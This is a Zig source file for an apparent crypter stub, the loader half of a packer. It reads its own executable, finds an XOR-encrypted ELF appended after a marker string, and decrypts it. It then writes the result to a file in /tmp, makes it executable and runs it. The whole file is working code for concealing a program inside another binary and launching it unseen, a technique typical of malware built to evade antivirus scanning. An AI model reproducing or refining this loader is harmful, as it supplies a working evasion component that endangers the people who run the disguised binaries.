const std = @import("std");
const decryptor = @import("decryptor.zig");
const linux = std.os.linux;

// This marker will be appended to the binary, not embedded in it
const PAYLOAD_START_MARKER = "PAYLOAD_START_MARKER";

pub fn main() !void {
    const allocator = std.heap.page_allocator;

    // Get the encrypted payload from the binary
    const payload_data = try get_embedded_payload(allocator);
    defer allocator.free(payload_data);

    // First byte is the key, rest is encrypted payload
    const key = payload_data[0];
    const encrypted_payload = payload_data[1..];

    std.debug.print("[STUB] Found payload: key=0x{x}, size={}\n", .{ key, encrypted_payload.len });

    // Decrypt the payload
    const decrypted = try decryptor.xor_decrypt(allocator, encrypted_payload, key);
    defer allocator.free(decrypted);

    std.debug.print("[STUB] Decrypted payload size: {}\n", .{decrypted.len});

    // Validate it's an ELF file
    if (decrypted.len >= 4 and std.mem.eql(u8, decrypted[0..4], "\x7fELF")) {
        std.debug.print("[STUB] Valid ELF detected, executing via tempfile\n", .{});
        try execute_via_tempfile(decrypted);
    } else {
        std.debug.print("[STUB] ERROR: Decrypted data is not a valid ELF file\n", .{});
        if (decrypted.len >= 16) {
            std.debug.print("[STUB] First 16 bytes: ", .{});
            for (decrypted[0..16]) |b| {
                std.debug.print("{x:0>2} ", .{b});
            }
            std.debug.print("\n", .{});
        }
        return error.InvalidPayload;
    }
}

fn get_embedded_payload(allocator: std.mem.Allocator) ![]u8 {
    // Read our own binary
    const self_binary = try std.fs.cwd().readFileAlloc(allocator, "/proc/self/exe", 100 * 1024 * 1024);
    defer allocator.free(self_binary);

    std.debug.print("[STUB] Self binary size: {}\n", .{self_binary.len});

    // Look for marker from the end of file backwards
    if (std.mem.lastIndexOf(u8, self_binary, PAYLOAD_START_MARKER)) |marker_start| {
        const data_start = marker_start + PAYLOAD_START_MARKER.len;

        std.debug.print("[STUB] Found marker at: {}, data starts at: {}\n", .{ marker_start, data_start });

        // Read payload size (8 bytes, little endian)
        if (data_start + 8 >= self_binary.len) {
            std.debug.print("[STUB] ERROR: Not enough data for size header\n", .{});
            return error.InvalidPayload;
        }

        const size_bytes = self_binary[data_start .. data_start + 8];
        const payload_size = std.mem.readInt(u64, size_bytes[0..8], .little);

        std.debug.print("[STUB] Payload size from header: {}\n", .{payload_size});

        // Read the actual payload data (key + encrypted data)
        const payload_start = data_start + 8;
        const total_payload_size = payload_size + 1; // +1 for key byte
        const payload_end = payload_start + total_payload_size;

        if (payload_end > self_binary.len) {
            std.debug.print("[STUB] ERROR: Payload extends beyond binary end ({} > {})\n", .{ payload_end, self_binary.len });
            return error.InvalidPayload;
        }

        const payload = try allocator.alloc(u8, total_payload_size);
        @memcpy(payload, self_binary[payload_start..payload_end]);
        return payload;
    }

    std.debug.print("[STUB] ERROR: Payload marker not found\n", .{});
    return error.PayloadNotFound;
}

fn execute_via_tempfile(payload: []const u8) !void {
    // Generate a unique temp filename
    var temp_name_buffer: [256]u8 = undefined;
    const temp_name = try std.fmt.bufPrint(&temp_name_buffer, "/tmp/zyra_{}", .{std.time.timestamp()});

    std.debug.print("[STUB] Writing to temp file: {s}\n", .{temp_name});

    // Write to temp file
    const temp_file = try std.fs.cwd().createFile(temp_name, .{});
    defer temp_file.close();
    defer std.fs.cwd().deleteFile(temp_name) catch {};

    try temp_file.writeAll(payload);
    try temp_file.chmod(0o755);
    temp_file.close();

    std.debug.print("[STUB] Executing temp file\n", .{});

    // Execute it
    var process = std.process.Child.init(&[_][]const u8{temp_name}, std.heap.page_allocator);
    process.stdin_behavior = .Inherit;
    process.stdout_behavior = .Inherit;
    process.stderr_behavior = .Inherit;

    const result = try process.spawnAndWait();
    std.debug.print("[STUB] Process exited with code: {}\n", .{result});
}
